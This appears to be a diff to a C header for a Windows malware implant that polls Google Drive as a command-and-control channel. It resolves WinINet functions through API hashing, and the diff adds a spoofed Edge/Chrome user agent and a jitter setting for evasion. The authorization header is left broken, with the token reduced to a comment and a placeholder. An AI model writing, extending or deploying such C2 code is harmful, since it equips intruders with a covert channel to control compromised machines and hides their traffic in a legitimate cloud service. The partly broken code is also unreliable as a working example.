@@ -5,10 +5,11 @@
 #include <wininet.h>
 #include "api_hashes.h"
 
-// Note: In a real scenario, these would be obfuscated or fetched dynamically
 #define GDRIVE_HOST L"www.googleapis.com"
-#define GDRIVE_API_URL L"/drive/v3/files"
-#define AUTH_TOKEN L"Bearer YOUR_OAUTH_TOKEN_HERE"
+#define GDRIVE_API_URL L"/drive/v3/files?pageSize=1&fields=files(id,name,webContentLink)"
+#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edge/120.0.0.0"
+
+#define C2_JITTER 25 
 
 typedef struct _GDRIVE_API {
     ULONG_PTR InternetOpenW;
@@ -34,7 +35,9 @@ static void InitGDriveApi() {
 }
 
 static BOOL GDrive_CheckForCommands(char* buffer, DWORD bufferSize) {
-    HINTERNET hInternet = ((HINTERNET(WINAPI *)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))g_GDriveApi.InternetOpenW)(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    LPCWSTR authToken = L"Bearer [ENCRYPTED_TOKEN_HERE]";
+
+    HINTERNET hInternet = ((HINTERNET(WINAPI *)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))g_GDriveApi.InternetOpenW)(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) return FALSE;
 
     HINTERNET hConnect = ((HINTERNET(WINAPI *)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR))g_GDriveApi.InternetConnectW)(hInternet, GDRIVE_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
@@ -43,7 +46,6 @@ static BOOL GDrive_CheckForCommands(char* buffer, DWORD bufferSize) {
         return FALSE;
     }
 
-    // Example: GET /drive/v3/files?q=name='cmd.txt'
     HINTERNET hRequest = ((HINTERNET(WINAPI *)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD, DWORD_PTR))g_GDriveApi.HttpOpenRequestW)(hConnect, L"GET", GDRIVE_API_URL, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
     if (!hRequest) {
         ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hConnect);
@@ -51,7 +53,7 @@ static BOOL GDrive_CheckForCommands(char* buffer, DWORD bufferSize) {
         return FALSE;
     }
 
-    LPCWSTR headers = L"Authorization: " AUTH_TOKEN;
+    LPCWSTR headers = L"Authorization: "; // authToken
     BOOL sent = ((BOOL(WINAPI *)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD))g_GDriveApi.HttpSendRequestW)(hRequest, headers, (DWORD)-1, NULL, 0);
 
     if (sent) {
@@ -67,4 +69,4 @@ static BOOL GDrive_CheckForCommands(char* buffer, DWORD bufferSize) {
     return sent;
 }
 
-#endif // GDRIVE_C2_H
+#endif
